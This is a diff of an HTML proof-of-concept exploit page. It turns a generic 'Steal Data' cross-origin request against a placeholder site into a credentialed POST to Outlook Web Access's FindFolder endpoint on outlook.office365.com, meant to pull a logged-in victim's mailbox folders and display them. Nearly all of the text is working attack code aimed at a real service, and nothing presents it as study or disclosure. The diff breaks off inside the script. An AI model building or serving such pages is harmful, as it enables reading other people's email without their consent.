@@ -1,28 +1,36 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CORS Exploit Test</title>
+  <title>FindFolder CORS Exploit</title>
 </head>
 <body>
-  <h1>CORS Exploit PoC</h1>
-  <button onclick="stealData()">Steal Data</button>
+  <h1>Exploit: POST to FindFolder</h1>
+  <button onclick="exploit()">Send Exploit Request</button>
 
   <pre id="output">Waiting...</pre>
 
   <script>
-    function stealData() {
-      fetch("https://vulnerable-site.com/api/data", {
-        method: "GET",
-        credentials: "include" // include cookies or credentials
+    function exploit() {
+      fetch("https://outlook.office365.com/owa/service.svc?action=FindFolder&app=Mail&n=43", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          // Adjust based on what FindFolder expects
+          FolderId: "inbox",
+          IncludeSubfolders: true
+        })
       })
       .then(response => {
         if (!response.ok) {
-          throw new Error("Network response was not ok");
+          throw new Error("Request failed: " + response.status);
         }
-        return response.text(); // or .json() depending on the response
+        return response.text();
       })
       .then(data => {
-        document.getElementById("output").textContent = "Leaked data:\n" + data;
+        document.getElementById("output").textContent = "Response:\n" + data;
       })
       .catch(error => {
         document.getElementById("output").textContent = "Error:\n" + error;
